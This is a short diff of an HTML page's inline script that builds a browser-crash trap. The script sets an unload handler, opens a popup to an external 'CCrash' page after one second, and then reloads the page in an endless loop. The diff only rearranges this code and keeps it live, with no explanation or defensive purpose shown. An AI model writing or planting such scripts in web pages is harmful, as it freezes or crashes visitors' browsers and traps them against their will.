@@ -10,10 +10,10 @@
 
 <body>
   <script>
-    window.open("https://eman225511.github.io/CCrash/");
     onbeforeunload = function(){localStorage.x=1};
 
     setTimeout(function(){
+      window.open("https://eman225511.github.io/CCrash/", "_blank");
       while(1)location.reload(1)
     }, 1000)
   </script>
